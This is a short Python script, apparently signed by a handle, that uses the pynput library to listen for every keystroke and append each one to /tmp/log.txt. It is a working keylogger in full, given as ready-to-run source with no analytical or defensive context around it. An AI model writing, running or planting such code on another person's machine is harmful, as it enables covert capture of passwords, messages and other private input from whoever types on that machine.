#k4m1k4z13r wuz here
from pynput.keyboard import Key, Listener

def _pressed(key): #when a key is pressed
	with open('/tmp/log.txt','a') as f: #open log file in append mode
		f.write(str(key)+"\n") #write the key to the log file

def _released(key): #when a key is released
	pass #do nothing

with Listener(on_press=_pressed,on_release=_released) as listener:
	listener.join()
